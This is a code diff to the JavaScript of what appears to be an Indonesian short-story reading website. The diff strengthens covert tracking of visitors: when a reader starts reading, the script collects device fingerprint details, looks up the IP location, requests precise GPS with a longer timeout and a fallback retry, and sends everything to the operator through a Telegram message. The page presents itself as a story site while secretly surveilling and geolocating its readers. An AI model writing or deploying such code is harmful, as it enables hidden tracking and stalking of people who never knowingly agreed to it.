@@ -52,18 +52,17 @@ function handleStartReading() {
         navigator.getBattery().then(battery => {
             let batteryLevelInfo = Math.round(battery.level * 100) + '%';
             let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
-            gatherDataAndSend({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            gatherDataAndTriggerGPS({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
         }).catch(() => {
-            gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+            gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
         });
     } else {
-        gatherDataAndSend({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+        gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
     }
-
     transitionToReader();
 }
 
-function gatherDataAndSend(metrics) {
+function gatherDataAndTriggerGPS(metrics) {
     fetch('https://ipwho.is/')
         .then(res => res.json())
         .then(data => {
@@ -72,25 +71,37 @@ function gatherDataAndSend(metrics) {
             let city = data.city || "Unknown City";
             let region = `${data.region || ""}, ${data.country || "Indonesia"}`;
             let ipCoords = (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : null;
-
-            // Minta Izin GPS Akurat
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
-                        sendTelegramMessage(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯");
+                        sendTelegramMessage(ip, city, region, isp, gpsCoords, metrics, "GPS Akurat 🎯 (Diizinkan & Aktif ✅)");
                     },
-                    () => {
-                        sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                    (error) => {
+                        let reason = (error.code === error.TIMEOUT) ? "Timeout (GPS Lama Nyala ⌛)" : "GPS Ditolak ❌";
+                        sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, `Estimasi IP 🌐 (${reason})`);
                     },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
                 );
             } else {
-                sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐");
+                sendTelegramMessage(ip, city, region, isp, ipCoords, metrics, "Estimasi IP 🌐 (GPS Tidak Didukung)");
             }
         })
         .catch(() => {
-            sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal ❌");
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let gpsCoords = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", gpsCoords, metrics, "GPS Akurat 🎯 (Diizinkan & Aktif ✅)");
+                    },
+                    () => {
+                        sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal Total ❌");
+                    },
+                    { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
+                );
+            } else {
+                sendTelegramMessage("N/A", "Unknown", "Indonesia", "Mobile Gateway", null, metrics, "Gagal Total ❌");
+            }
         });
 }
 
@@ -102,16 +113,16 @@ function sendTelegramMessage(ip, city, region, isp, coords, d, modeLoc) {
 
     const message = `📖 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
                     `🌐 IP: ${ip}\n` +
-                    `📍 Location (IP): ${city}, ${region}\n` +
+                    `📍 IP Location: ${city}, ${region}\n` +
                     `📶 Provider: ${isp}\n` +
-                    `📍 Location Mode: ${modeLoc}\n` +
-                    `📌 Koordinat: ${coordText}\n\n` +
+                    `📍 Currently Locs: ${modeLoc}\n` +
+                    `📌 Coordinate: ${coordText}\n\n` +
                     `⏱️ Time Access: ${d.accessTime}\n` +
                     `🌍 Time Zone: ${d.timeZone}\n` +
                     `💻 Device/OS: ${d.deviceName}\n` +
                     `⚙️ CPU Cores: ${d.cpuCores}\n` +
                     `🧠 RAM: ${d.deviceRam}\n` +
-                    `📱 OS Resolution: ${d.screenRes}\n` +
+                    `📱 Screen Resolution: ${d.screenRes}\n` +
                     `🗣️ Language: ${d.browserLang}\n` +
                     `⚡ Connection: ${d.connInfo}\n` +
                     `🔋 Battery: ${d.battery} (${d.charge})`;
@@ -222,4 +233,5 @@ function changeFontSize(direction) {
     paragraphs.forEach(p => {
         p.style.fontSize = `${currentFontSize}rem`;
     });
-}
+            }
+    
